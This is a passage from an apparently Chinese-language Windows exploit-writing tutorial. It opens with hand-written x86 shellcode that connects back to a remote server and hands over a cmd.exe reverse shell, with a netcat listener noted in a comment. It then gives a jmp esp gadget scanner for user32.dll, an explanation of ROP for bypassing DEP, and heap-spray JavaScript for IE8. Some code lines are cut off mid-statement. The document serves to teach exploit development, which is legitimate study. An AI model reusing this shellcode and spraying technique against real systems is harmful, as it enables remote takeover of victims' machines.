            mov ax,0x2
            push ax;push AF_INET -->sa_family
            mov ebx,esp; store sock_addr
            //Connect(socket,&sock_addr,sizeof(sock_addr));
            /*
            00000000 sockaddr        struc ; (sizeof=0x10, align=0x2, copyof_12)
            00000000                                         ; XREF: _wmain_0/r
            00000000 sa_family --> AF_INET(2)               ; XREF: _wmain_0+80/w
            00000002 sa_data  -->  htons(REMOTE_PROT)        ; XREF: _wmain_0+75/w
            00000004 sa_data+2 --> inet_addr(REMOTE_ADDR)     ; _wmain_0+9B/w
            00000010 sockaddr        ends
            */
            push 0x10 ; sizeof(sock_addr)
            push ebx ;scok_addr
            push [esp+0x10];socket
            call edx ;connect  ;    server#nc -l 6666 (close fire wall)
    在本地创建cmd.exe子进程
    注意这两个语句也需要实现，否则只能在本地打开一个shell
    #define STARTF_USESTDHANDLES    0x00000100
    即使用父进程的句柄（我们的Socket也是一个句柄）而不是全新的句柄。
    //si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    //si.wShowWindow=SW_HIDE;
            /*创建cmd.exe子进程*/
            /*
            00000000 _STARTUPINFOW   struc ; (sizeof=0x44, align=0x4, copyof_14)
            00000000                                         ; XREF: _wmain_0/r
            00000000 cb              ->size 44               ; XREF: _wmain_0+134/w
            00000004 lpReserved      dd ?                    ; offset
            00000008 lpDesktop       dd ?                    ; offset
            0000000C lpTitle         dd ?                    ; offset
            00000010 dwX             dd ?
            00000014 dwY             dd ?
            00000018 dwXSize         dd ?
            0000001C dwYSize         dd ?
            00000020 dwXCountChars   dd ?
            00000024 dwYCountChars   dd ?
            00000028 dwFillAttribute dd ?
            0000002C dwFlags         socket                ; XREF: _wmain_0+159/w ; offset
            0000003C hStdOutput      ->socket                 ; XREF: _wmain_0+14D/w
            00000040 hStdError       ->socket                 ; XREF: _wmain_0+141/w
            00000040                                         ; _wmain_0+147/r ; offset
            00000044 _STARTUPINFOW   ends
            00000044
    */
            //init _STARTUPINFO
            mov esi,[esp+0x8]
            push esi; push hStdError
            push esi; push hStdOutput
            push esi; push StdInput
            xor esi,esi
            xor ecx,ecx
            push esi;
            push esi;
            push 0x100; dwFlags
            mov cx,0xa
    PUSH_NULL:    
            push esi
            loop PUSH_NULL
            mov ecx,0x44 ;cb
            push ecx
            mov edx,esp ;_STARTUPINFO
            mov ebx,[esp+0x90];CreateProcess
            push 0x657865;exe
            push 0x2E646D63;cmd.
            mov esi,esp ;"cmd.exe"
            //CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)
            push edx;&pi
            push edx ;&si
            xor ecx,ecx
            push ecx;NULL
            push ecx;NULL
            push ecx;NULL
            inc ecx
            push ecx;TRUE
            sub ecx,0x1
            push ecx;NULL
            push ecx;NULL
            push esi;cmdline
            push ecx;NULL
            call ebx;CreateProcess
            push eax
在执行call之后，你的服务器会得到一个windows的反弹shell。生成Unicode码之后，继续用可怜的IE8来做实验。
## 0x04 shellcode布置技术
我们知道在栈溢出中，可以将shellcode布置在栈空间的不同位置，同样在实际漏洞利用中，尤其在栈溢出已经落寞的今天，堆利用中，布置shellcode方法更是层出不穷，笔者也无法将所有的方案汇总全面，就仅对目前常见的几种布置技术做个总结。
###  Jmp esp /ROP
在Windows中使用jmp
esp(跳板技术)的频率远远高于linux（虽然这种技术在linux下也可用），比起将shellcode放在ret地址后面，将shellcode放在栈顶能有效减少空间。通过调用jmp
esp将程序跳转到shellcode。
虽然在DEP和ASLR盛行的年代，这个技术也早已不再有用武之地。但除了对于研究历史漏洞帮助，该技术还是引入ROP这个概念的一个前置知识，在学习了ROP之后，你会忽然领悟的。
这次让我们放下windbg，自己动手编程实现寻找jmp esp
**编程实现寻找gadget**
以jmp esp为案例，寻找user32.dll中的所有jmp esp地址。
    #include "stdafx.h"
    #include
    #define DLL_Name "user32.dll"
    int _tmain(int argc, _TCHAR* argv[])
    {
    ​    HINSTANCE handle=LoadLibraryA(DLL_Name);
    ​    if(!handle){
    ​        printf("load dll errorn");
    ​        exit(0);
    ​    }
    ​    printf("Load success...n");
    ​    BYTE *ptr=(BYTE*)handle;
    ​    BOOL flag=false;
    ​    for(int i=0;!flag;i++)
    ​    {
    ​        try{
    ​        if(ptr[i]==0xFF&&ptr[i+1]==0xE4) //JMP ESP的十六进制码=0xFFE4
    ​            printf("ttptr->jmp esp = 0x%xn",((int)ptr+i));
    ​        }
    ​        catch(...)
    ​        {
    ​            int address=(int)ptr+i;
    ​            printf("END OF 0x%xn",address);
    ​            flag=true;
    ​        }
    ​    }
    ​    return 0;
    }
###  使用ROP绕过DEP
ROP技术是用于绕过栈不可执行（其实现在的堆也不可执行咯），什么是ROP技术。其实之前的jmp
esp已经引出了ROP的基础理念，即使用程序自身text段的机器码执行。
ROP的全程面向返回语句的编程，一个个gadgets串联起来的链叫做ROP链。每个gadgets的格式大概为“ 指令 指令
ret”，通过ret命令将所有的gadgets串联起来。
如果说jmp esp是一个跳板就直指靶心，那么ROP就是经过好多跳板，分步骤完成自己的命令。
常见的绕过DEP的案例，就是通过ROP实现VirtualProtect来对shellcode所在内存修改属性（相当于关闭DEP），将其修改为可执行，再通过JMP
R32来跳转执行Shellcode。
具体案例可以参考我之前写的对IE浏览器写的Exploit  
###  HeapSpray
堆喷射是一种shellcode布置技术，常常借助javascript等脚本语言实现，所以常见于浏览器漏洞。
上古的堆喷射
在Windows XP
SP3以前，Windows下大部分程序都不会默认开始DEP（或者不支持），只需要构建nop（大量）+shellcode的内存块,使用javascript申请200MB的内存空间，能够覆盖内存的大量空间。只要控制程序流跳转到类似0x0c0c0c0c（也可以是其他位置，只要足够稳定就行）这样就会顺着nops一路滑到shellcode并且执行。
参考代码
    shellcode="u1234u1234u1234u1234u1234u1234u1234u1234u1234u1234u1234u1234";
    var nop="u9090u9090";
    while(nop.length
精确堆喷射
在Windows进入后DEP时代，面临DEP和ASLR的双重防线，DEP导致堆中的数据无法执行，之前布置大量数据以量取胜的战术失去了意义。于是heap-feng-shui（堆风水）技术被提出。
通过堆风水，我们申请0x1000个0x80000大小的堆块。分配量足够大，导致堆块中的每0x1000个小的片的开始地址都是固定，通常为0xYYYY020。
因此我们能够将ROP链的头部稳定对齐末尾固定的四字节（例如0xYYYY0050）。这样就能构成某种意义上的精确喷射。
参考文献：
IE8下的参考代码（shellcode喷射对齐0x0c0c0c0c）
    ​    
    ​    var sc="u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141";
    ​    var nop="u0c0cu0c0c";
    ​    var offset=0x5ee-4/2;//0xbdc/2-4/2
    ​    //以0x10000为单位的shellcode+nop结构单元
    ​    while(nop.length
参考文献：
[1]peter.《Exploit编写教程》[OL/DB],2010
[2]《现代化windows漏洞程序开发》[OL/DB],2016
[3]Failwest.《0day安全》[M].电子工业出版社,2011
[4][PEB手工分析](https://blog.csdn.net/hgy413/article/details/8490918)
[5][WinXp符号表不支持解决方案](https://blog.csdn.net/qq_38924942/article/details/87801649)
[6]
[7]